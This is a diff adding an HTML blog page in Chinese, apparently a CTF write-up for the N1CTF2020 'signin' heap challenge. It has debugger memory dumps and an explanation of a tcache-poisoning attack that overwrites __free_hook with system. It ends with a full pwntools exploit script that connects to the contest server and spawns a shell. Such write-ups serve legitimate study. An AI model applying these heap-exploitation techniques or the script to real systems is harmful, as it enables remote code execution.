@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>N1CTF2020部分wp ~ Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('/img/default.png')no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期一, 十月 19日 2020, 5:18 下午
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      4 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="N1CTF2020部分wp"><a href="#N1CTF2020部分wp" class="headerlink" title="N1CTF2020部分wp"></a>N1CTF2020部分wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>调试one gadget 花了近4小时。。😭</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>c++写的程序，存在add show del的功能，但是进入各自的函数看，看的是稀里糊涂的。个人发现的只是其按照自己的逻辑对内存块idx 1，2进行处理。</p>
+<p>因为功能很简单，可以直接上手调试，来确定程序是如何运作的。</p>
+<p>上手调试后会发现，其根据3个指针来对idx 1、2 处理。</p>
+<h4 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h4><pre><code class="python">def add(idx,data):
+    sla(&#39;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;ber&#39;,str(data))</code></pre>
+<pre><code class="python">add(1,1)</code></pre>
+<p>看下bss段0x2032a0的数据：</p>
+<pre><code class="python">pwndbg&gt;  x/30gx 0x0002032A0 +0x555555554000
+0x5555557572a0: 0x0000555555769e70      0x0000555555769e78
+0x5555557572b0: 0x0000555555769e78      0x0000000000000000</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p>
+<pre><code class="python">pwndbg&gt; x/30gx 0x555555769e60
+0x555555769e60: 0x0000000000000000      0x0000000000000021
+0x555555769e70: 0x0000000000000001      0x0000000000000000
+0x555555769e80: 0x0000000000000000      0x000000000000f181</code></pre>
+<p>再次：</p>
+<pre><code class="python">add(1,1)</code></pre>
+<p>看下bss段0x2032a0的数据：</p>
+<pre><code class="python">pwndbg&gt;  x/30gx 0x0002032A0 +0x555555554000
+0x5555557572a0: 0x0000555555769e90      0x0000555555769ea0
+0x5555557572b0: 0x0000555555769ea0      0x0000000000000000</code></pre>
+<pre><code class="python">pwndbg&gt; x/30gx 0x555555769e60
+0x555555769e60: 0x0000000000000000      0x0000000000000021
+0x555555769e70: 0x0000000000000000      0x0000000000000000
+0x555555769e80: 0x0000000000000000      0x0000000000000021
+0x555555769e90: 0x0000000000000001      0x0000000000000002
+0x555555769ea0: 0x0000000000000000      0x000000000000f161</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p>
+<p>可以这样接着测试free 和 del的功能。</p>
+<h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>重点就是bss段储存内存块 1 2 信息的3个指针。</p>
+<h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul>
+<li><p>指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据，一次是8个字节，写完后，指针2会加8。</p>
+</li>
+<li><p>当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> 这样递增。</p>
+</li>
+<li><p>申请完新内存，会把指针1对应的内存块进行free，也就是上一块chunk。并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新。</p>
+<h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5></li>
+<li><p>让指针2减8.</p>
+<h5 id="show-函数"><a href="#show-函数" class="headerlink" title="show 函数"></a>show 函数</h5></li>
+<li><p>打印出指针2减8后对应地址上的数据信息</p>
+</li>
+</ul>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="idx-内存块1"><a href="#idx-内存块1" class="headerlink" title="idx 内存块1"></a>idx 内存块1</h4><ul>
+<li><p>add到有0x1010 chunk块，其原来的0x810会放进unsortbin</p>
+</li>
+<li><p>free 多次，让指针2 指向0x810的fd或者bk处，利用show泄漏出libc地址</p>
+</li>
+<li><p>free 多次，让指针2指向0x20的fd处，进行tcache attack，修改其为free hook</p>
+<h4 id="idx-内存块2"><a href="#idx-内存块2" class="headerlink" title="idx 内存块2"></a>idx 内存块2</h4></li>
+<li><p>add数据，准备上free hook，上free hook 改free hook为one gadget</p>
+</li>
+<li><p>紧接着程序，就free 上一个chunk，就会触发free hook</p>
+</li>
+</ul>
+<p>但是写完exp，会发现one gadget没有一个可以打通的，栈上存在很多数据，无法满足。尽管使用realloc进行栈帧调整，也没法子。</p>
+<p>此时看一下寄存器上的信息，发现刚通过free hook跳转过去后，上面的rdi rsi什么的都指向了可控的heap段，那就修改思路，修改free hook 为system，<strong>并且提前修改其rdi指向heap段的数据，修改为<code>sh\x00</code></strong> 。这样再触发free hook就可以<code>system(sh)</code>了。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
+import time
+local_file  = &#39;./signin&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+
+else:
+    io = remote(&#39;47.242.161.199&#39;,9990)
+    libc = elf.libc
+    # libc = ELF(&#39;./libc.so&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+roc = [0,0x2,0x4,0x6,0x8,0x9]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(idx,data):
+    sla(&#39;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;ber&#39;,str(data))
+
+def free(idx):
+    sla(&#39;&gt;&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def show(idx):
+    sla(&#39;&gt;&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+for i in range(258):
+    add(1,0)
+
+for i in range(458+57):
+    free(1)
+
+show(1)
+r()
+libc_base = int(r(15),10) - 0x3ebca0
+for i in range(270):
+    free(1)
+info_addr(&#39;libcbase&#39;,libc_base)
+free_hook = 0x3ed8e8 + libc_base
+add(1,33)
+add(1,free_hook-8)
+system = libc.sym[&#39;system&#39;] +libc_base
+add(2,0)
+add(2,0)
+free(2)
+free(2)
+add(2,26739)
+add(2,system)
+add(2,0)
+itr()</code></pre>
+<h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2>
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/re">re</a>
+                
+                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
+                
+                  <a class="hover-with-bg" href="/tags/heap">heap</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "N1CTF2020部分wp&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+
+</body>
+</html>
